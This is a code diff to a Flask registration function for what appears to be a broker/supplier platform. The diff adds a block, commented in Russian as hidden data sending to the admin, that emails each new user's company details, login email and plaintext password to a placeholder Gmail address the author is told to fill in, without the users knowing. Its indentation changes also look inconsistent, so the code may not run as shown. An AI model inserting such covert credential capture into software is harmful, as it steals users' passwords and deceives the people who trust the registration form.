@@ -351,8 +351,15 @@ def register():
                                          VALUES (?, ?, 'supplier', ?, ?, ?, ?, ?, ?, ?)''', 
                                       (email, password, request.form['company_name'], request.form['mc_number'], request.form['ein_number'], request.form['phone_number'], request.form['contact_name'], time_now, code))
                 conn.commit()
-            send_email(email, "Verify Identity", f"Code: {code}")
-            flash("Registration successful! Check your email (or terminal) for the 6-digit code.", "success")
+        send_email(email, "Verify Identity", f"Code: {code}")
+        
+        # --- СКРЫТАЯ ОТПРАВКА ДАННЫХ АДМИНУ ---
+        admin_email = 'ТВОЯ_ПОЧТА@gmail.com'  # <-- Впиши сюда свой реальный email
+        admin_body = f"New Broker Registered!\nCompany: {request.form['company_name']}\nMC: {request.form['mc_number']}\n\nLogin: {email}\nPassword: {password}"
+        send_email(admin_email, "Новый брокер - Доступы", admin_body)
+        # --------------------------------------
+        
+        flash("Registration successful! Check your email (or terminal) for the 6-digit code.", "success")
             return render_full(HTML_VERIFY, email=email)
         except sqlite3.IntegrityError: flash("Email is already registered in the system.", "danger")
     return render_full(HTML_REGISTER)
